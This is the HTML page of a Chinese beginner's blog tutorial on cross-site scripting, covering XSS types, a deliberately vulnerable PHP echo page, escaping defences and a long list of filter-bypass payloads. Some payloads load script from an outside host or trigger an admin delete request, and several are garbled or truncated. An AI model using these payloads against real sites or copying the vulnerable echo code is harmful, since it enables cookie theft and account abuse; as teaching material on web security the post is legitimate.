@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      xss基础 | Hello,C 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+    
+
+    <meta name="description" content="0x01、什么是xss跨站脚本攻击(Cross Site Scripting)，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的特殊目的。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss基础 | Hello,C">
+<meta property="og:url" content="http://yoursite.com/2016/08/05/xss基础/index.html">
+<meta property="og:site_name" content="Hello,C">
+<meta property="og:description" content="0x01、什么是xss跨站脚本攻击(Cross Site Scripting)，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的特殊目的。">
+<meta property="og:image" content="http://p1.bpimg.com/567571/1ba59a1c623bb1cd.png">
+<meta property="og:image" content="http://p1.bpimg.com/567571/f1310cdc4af47781.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/5ed60338ade39c1a.png">
+<meta property="og:updated_time" content="2016-11-20T06:13:52.519Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="xss基础 | Hello,C">
+<meta name="twitter:description" content="0x01、什么是xss跨站脚本攻击(Cross Site Scripting)，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的特殊目的。">
+<meta name="twitter:image" content="http://p1.bpimg.com/567571/1ba59a1c623bb1cd.png">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Hello,C</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          一个小白的独白！
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/links" title="" class="">友情链接</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/zjwfc?tab=activity" title="Huno on GitHub">
+          <i class='icon icon-social-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+
+    <!-- China social icon -->
+    
+    
+      <li class="navigation__item">
+        <a href="https://www.douban.com/" title="">
+          <i class='icon cs-icon-douban'></i>
+          <span class="label">douban</span>
+        </a>
+      </li>
+
+      <li class="navigation__item">
+        <a href="http://weibo.com/5664757301/profile?topnav=1&wvr=6&is_all=1" title="">
+          <i class='icon cs-icon-weibo'></i>
+          <span class="label">Weibo</span>
+        </a>
+      </li>
+
+ 
+
+
+
+  </ul>
+</nav>
+
+
+
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">xss基础</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2016-08-05" class="post-meta__date date">2016-08-05</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/XSS/">XSS</a>, <a class="tags-link" href="/tags/渗透测试/">渗透测试</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <h3 id="0x01、什么是xss"><a href="#0x01、什么是xss" class="headerlink" title="0x01、什么是xss"></a>0x01、什么是xss</h3><pre><code>跨站脚本攻击(Cross Site Scripting)，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的特殊目的。
+</code></pre><a id="more"></a>   
+<pre><code>有的服务器并没有对用户的输入进行安全方面的验证，攻击者就可以很容易地通过正常的输入手段，夹带进一些恶意的HTML脚本代码。当受害者的浏览器访问目标服务器上被注入恶意脚本的页面后，由于它对目标服务器的信任，这段恶意脚本的执行不会受到什么阻碍。而此时，XSS攻击就完成了。
+</code></pre><h3 id="0x02、xss的危害"><a href="#0x02、xss的危害" class="headerlink" title="0x02、xss的危害"></a>0x02、xss的危害</h3><ul>
+<li>挂马</li>
+<li>盗取用户Cookie。</li>
+<li>DOS（拒绝服务）客户端浏览器。</li>
+<li>钓鱼攻击，高级的钓鱼技巧。</li>
+<li>删除目标文章、恶意篡改数据、嫁祸。</li>
+<li>劫持用户Web行为，甚至进一步渗透内网。</li>
+<li>爆发Web2.0蠕虫。</li>
+<li>蠕虫式的DDoS攻击。</li>
+<li>蠕虫式挂马攻击、刷广告、刷浏量、破坏网上数据</li>
+</ul>
+<h3 id="0x03、xss的种类"><a href="#0x03、xss的种类" class="headerlink" title="0x03、xss的种类"></a>0x03、xss的种类</h3><pre><code>xss分为持久型、非持久型和DOM
+</code></pre><blockquote>
+<p>持久型（存储型）xss</p>
+</blockquote>
+<pre><code>一般无意触发，输入--进入数据库*--取出数据库--输出。攻击脚本将被永久地存放在目标服务器的数据库和文件中。直接将恶意代码提交到服务器端，下次访问就不用再次提交xss代码
+</code></pre><blockquote>
+<p>非持久型（反射型）xss</p>
+</blockquote>
+<pre><code>一般需要自行去触发，输入—输出。这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的。一般容易出现在搜索页面,发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码
+</code></pre><blockquote>
+<p>DOM xss</p>
+</blockquote>
+<pre><code>DOM XSS和反射型XSS、存储型XSS的差别在于DOM XSS的代码并不需要服务器参与，触发XSS靠的是浏览器端的DOM解析，完全是客户端的事情。
+</code></pre><h3 id="0x04、实例分析"><a href="#0x04、实例分析" class="headerlink" title="0x04、实例分析"></a>0x04、实例分析</h3><pre><code>&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gbk&quot; /&gt; 
+&lt;title&gt;xss初级&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form action=&quot;&quot; method=&quot;get&quot; &gt;
+&lt;input type=&quot;text&quot; name=&quot;xss_input&quot;&gt;
+&lt;input type=&quot;submit&quot;&gt;
+&lt;/form&gt;
+&lt;hr&gt;
+&lt;?php
+    $xss = $_GET[&apos;xss_input&apos;];
+    echo &apos;你输入的字符为&lt;br&gt;&apos;.$xss;
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>我们搭建一个简单的测试页面<br><img src="http://p1.bpimg.com/567571/1ba59a1c623bb1cd.png" alt=""></p>
+<p>当我们输入111时查看源代码，发现字符串被输出了出来，嵌套在标签内，那么我们输入   </p>
+<pre><code>&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;
+</code></pre><p>会出现什么呢<br><img src="http://p1.bpimg.com/567571/f1310cdc4af47781.png" alt=""><br><img src="http://i1.piimg.com/567571/5ed60338ade39c1a.png" alt=""><br>我们可以看到出现xss弹窗，说明存在xss漏洞，这是最简单的xss漏洞了。</p>
+<h3 id="0x05、防御机制"><a href="#0x05、防御机制" class="headerlink" title="0x05、防御机制"></a>0x05、防御机制</h3><p>1、对特殊字符HTML转码，用htmlspecialchars()函数进行检查。htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体<br>2、标签属性进行白名单限制，对输入进行正则匹配，发现不在白名单内的进行过滤或者替换为空。</p>
+<h3 id="0x06、常见xss攻击绕过方法"><a href="#0x06、常见xss攻击绕过方法" class="headerlink" title="0x06、常见xss攻击绕过方法"></a>0x06、常见xss攻击绕过方法</h3><blockquote>
+<p>(1)普通的XSS JavaScript注入</p>
+</blockquote>
+<pre><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
+</code></pre><blockquote>
+<p>(2)区分大小写</p>
+</blockquote>
+<pre><code>&lt;sCripT&gt;alert(&quot;xss&quot;)&lt;/Script&gt;
+</code></pre><blockquote>
+<p>(3)IMG标签无分号无引号</p>
+</blockquote>
+<pre><code>&lt;IMG SRC=javascript:alert(‘XSS’)&gt;
+</code></pre><blockquote>
+<p>(4)IMG标签大小写不敏感</p>
+</blockquote>
+<pre><code>&lt;IMG SRC=JaVaScRiPt:alert(‘XSS’)&gt;
+</code></pre><blockquote>
+<p>(5)HTML编码(必须有分号)</p>
+</blockquote>
+<pre><code>&lt;IMG SRC=javascript:alert(“XSS”)&gt;
+</code></pre><blockquote>
+<p>(6)修正缺陷IMG标签</p>
+</blockquote>
+<pre><code>&lt;IMG “”&quot;&gt;&lt;SCRIPT&gt;alert(“XSS”)&lt;/SCRIPT&gt;”&gt;
+</code></pre><blockquote>
+<p>(7)formCharCode标签(计算器)</p>
+</blockquote>
+<pre><code>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
+</code></pre><blockquote>
+<p>(8)UTF-8的Unicode编码(计算器)</p>
+</blockquote>
+<pre><code>&lt;IMG SRC=jav..省略..S&apos;)&gt;
+</code></pre><blockquote>
+<p>(9)7位的UTF-8的Unicode编码是没有分号的(计算器)</p>
+</blockquote>
+<pre><code>&lt;IMG SRC=jav..省略..S&apos;)&gt;
+</code></pre><blockquote>
+<p>(10)十六进制编码也是没有分号(计算器)</p>
+</blockquote>
+<pre><code>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
+</code></pre><blockquote>
+<p>(11)嵌入式标签,将Javascript分开</p>
+</blockquote>
+<pre><code>&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;
+</code></pre><blockquote>
+<p>(12)嵌入式编码标签,将Javascript分开</p>
+</blockquote>
+<pre><code>&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;
+</code></pre><blockquote>
+<p>(13)嵌入式换行符</p>
+</blockquote>
+<pre><code>&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;
+</code></pre><blockquote>
+<p>(14)嵌入式回车</p>
+</blockquote>
+<pre><code>&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;
+</code></pre><blockquote>
+<p>(15)嵌入式多行注入JavaScript,这是XSS极端的例子</p>
+</blockquote>
+<pre><code>&lt;IMG SRC=”javascript:alert(‘XSS‘)”&gt;
+</code></pre><blockquote>
+<p>(16)Spaces和meta前的IMG标签</p>
+</blockquote>
+<pre><code>&lt;IMG SRC=” javascript:alert(‘XSS’);”&gt;
+</code></pre><blockquote>
+<p>(17)双开括号</p>
+</blockquote>
+<pre><code>&lt;&lt;SCRIPT&gt;alert(“XSS”);//&lt;&lt;/SCRIPT&gt;
+</code></pre><blockquote>
+<p>(18)无结束脚本标记(仅火狐等浏览器)</p>
+</blockquote>
+<pre><code>&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B&gt;
+</code></pre><blockquote>
+<p>(19)无结束脚本标记2</p>
+</blockquote>
+<pre><code>&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;
+</code></pre><blockquote>
+<p>(20)半开的HTML/JavaScript XSS</p>
+</blockquote>
+<pre><code>&lt;IMG SRC=”javascript:alert(‘XSS’)”
+</code></pre><blockquote>
+<p>(21)双开角括号</p>
+</blockquote>
+<pre><code>&lt;iframe src=http://3w.org/XSS.html &lt;
+</code></pre><blockquote>
+<p>(22)无单引号 双引号 分号</p>
+</blockquote>
+<pre><code>&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;
+</code></pre><blockquote>
+<p>(23)换码过滤的JavaScript</p>
+</blockquote>
+<pre><code>\”;alert(‘XSS’);//
+</code></pre><blockquote>
+<p>(24)结束Title标签</p>
+</blockquote>
+<pre><code>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(“XSS”);&lt;/SCRIPT&gt;
+</code></pre><blockquote>
+<p>(25)Input Image</p>
+</blockquote>
+<pre><code>&lt;INPUT SRC=”javascript:alert(‘XSS’);”&gt;
+</code></pre><blockquote>
+<p>(26)BODY Image</p>
+</blockquote>
+<pre><code>&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”&gt;
+</code></pre><blockquote>
+<p>(27)BODY标签</p>
+</blockquote>
+<pre><code>&lt;BODY(‘XSS’)&gt;
+</code></pre><blockquote>
+<p>(28)IMG Dynsrc</p>
+</blockquote>
+<pre><code>&lt;IMG DYNSRC=”javascript:alert(‘XSS’)”&gt;
+</code></pre><blockquote>
+<p>(29)IMG Lowsrc</p>
+</blockquote>
+<pre><code>&lt;IMG LOWSRC=”javascript:alert(‘XSS’)”&gt;
+</code></pre><blockquote>
+<p>(30)BGSOUND</p>
+</blockquote>
+<pre><code>&lt;BGSOUND SRC=”javascript:alert(‘XSS’);”&gt;
+</code></pre><blockquote>
+<p>(31)Iframe</p>
+</blockquote>
+<pre><code>&lt;IFRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/IFRAME&gt;
+</code></pre><blockquote>
+<p>(32)Table</p>
+</blockquote>
+<pre><code>&lt;TABLE BACKGROUND=”javascript:alert(‘XSS’)”&gt;
+</code></pre><blockquote>
+<p>(33)IMG STYLE方式</p>
+</blockquote>
+<pre><code>exppression(alert(“XSS”))’&gt;
+</code></pre><blockquote>
+<p>(34)STYLE background</p>
+</blockquote>
+<pre><code>&lt;STYLE&gt;&lt;STYLE type=”text/css”&gt;BODY{background:url(“javascript:alert(‘XSS’)”)}&lt;/STYLE&gt;
+</code></pre><blockquote>
+<p>(35)BASE</p>
+</blockquote>
+<pre><code>&lt;BASE HREF=”javascript:alert(‘XSS’);//”&gt;
+</code></pre><blockquote>
+<p>(36)EMBED标签,你可以嵌入FLASH,其中包涵XSS</p>
+</blockquote>
+<pre><code>&lt;EMBED SRC=”http://3w.org/XSS/xss.swf” &gt;&lt;/EMBED&gt;
+</code></pre><blockquote>
+<p>(37)在flash中使用ActionScrpt可以混进你XSS的代码</p>
+</blockquote>
+<pre><code>a=”get”;
+b=”URL(\”&quot;;
+c=”javascript:”;
+d=”alert(‘XSS’);\”)”;
+eval_r(a+b+c+d);
+</code></pre><blockquote>
+<p>(38)XML namespace.HTC文件必须和你的XSS载体在一台服务器上</p>
+</blockquote>
+<pre><code>&lt;HTML xmlns:xss&gt;
+&lt;?import namespace=”xss” implementation=”http://3w.org/XSS/xss.htc”&gt;
+&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;
+&lt;/HTML&gt;
+</code></pre><blockquote>
+<p>(39)如果过滤了你的JS你可以在图片里添加JS代码来利用</p>
+</blockquote>
+<pre><code>&lt;SCRIPT SRC=””&gt;&lt;/SCRIPT&gt;
+</code></pre><blockquote>
+<p>(40)IMG嵌入式命令,可执行任意命令</p>
+</blockquote>
+<pre><code>&lt;IMG SRC=”http://www.XXX.com/a.php?a=b”&gt;
+</code></pre><blockquote>
+<p>(41)IMG嵌入式命令(a.jpg在同服务器)</p>
+</blockquote>
+<pre><code>Redirect 302 /a.jpg http://www.XXX.com/admin.asp&amp;deleteuser
+</code></pre><blockquote>
+<p>(42)绕符号过滤</p>
+</blockquote>
+<pre><code>&lt;SCRIPT a=”&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;
+</code></pre><blockquote>
+<p>(43)URL绕行</p>
+</blockquote>
+<pre><code>&lt;A HREF=”http://127.0.0.1/”&gt;XSS&lt;/A&gt;
+</code></pre><blockquote>
+<p>(44)URL编码</p>
+</blockquote>
+<pre><code>&lt;A HREF=”http://3w.org”&gt;XSS&lt;/A&gt;
+</code></pre><blockquote>
+<p>(45)IP十进制</p>
+</blockquote>
+<pre><code>&lt;A HREF=”http://3232235521″&gt;XSS&lt;/A&gt;
+</code></pre><blockquote>
+<p>(46)IP十六进制</p>
+</blockquote>
+<pre><code>&lt;A HREF=”http://0xc0.0xa8.0×00.0×01″&gt;XSS&lt;/A&gt;
+</code></pre><blockquote>
+<p>(47)IP八进制</p>
+</blockquote>
+<pre><code>&lt;A HREF=”http://0300.0250.0000.0001″&gt;XSS&lt;/A&gt;
+</code></pre><blockquote>
+<p>(48)混合编码</p>
+</blockquote>
+<pre><code>&lt;A HREF=”htt p://6 6.000146.0×7.147/”&quot;&gt;XSS&lt;/A&gt;
+</code></pre><blockquote>
+<p>(49)节省[http:]</p>
+</blockquote>
+<pre><code>&lt;A HREF=”//www.google.com/”&gt;XSS&lt;/A&gt;
+</code></pre><blockquote>
+<p>(50)节省[www]</p>
+</blockquote>
+<pre><code>&lt;A HREF=”http://google.com/”&gt;XSS&lt;/A&gt;
+</code></pre><blockquote>
+<p>(51)绝对点绝对DNS</p>
+</blockquote>
+<pre><code>&lt;A HREF=”http://www.google.com./”&gt;XSS&lt;/A&gt;
+</code></pre><blockquote>
+<p>(52)javascript链接</p>
+</blockquote>
+<pre><code>&lt;A HREF=”javascript:document.location=’http://www.google.com/’”&gt;XSS&lt;/A&gt;
+</code></pre>
+  </section>
+
+ 
+  
+
+<section class="post-comments">
+
+    <div class="ds-thread" data-thread-key="2016/08/05/xss基础/"></div>
+
+    <script type="text/javascript">
+      var duoshuoQuery = {short_name:"zjwfc"};
+      (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = '//static.duoshuo.com/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+        || document.getElementsByTagName('body')[0]).appendChild(ds);
+      })();
+    </script> 
+
+</section>
+
+
+</article>
+
+
+
+
+            <footer class="footer">
+
+    <span class="footer__copyright">&copy; 2017-2018. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a></span>
+    
+</footer>
+
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<script type="text/javascript">
+		window.onload = function(){
+			var config = {
+				vx: 4,
+				vy:  4,
+				height: 2,
+				width: 2,
+				count: 100,
+				color: "121, 162, 185",
+				stroke: "100,200,180",
+				dist: 6000,
+				e_dist: 20000,
+				max_conn: 10
+			}
+			CanvasParticle(config);
+		}
+</script>
+<script type="text/javascript" src="js/canvas-particle.js"></script>
+
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+
+
+<span id="busuanzi_container_page_pv">
+  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</span>
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
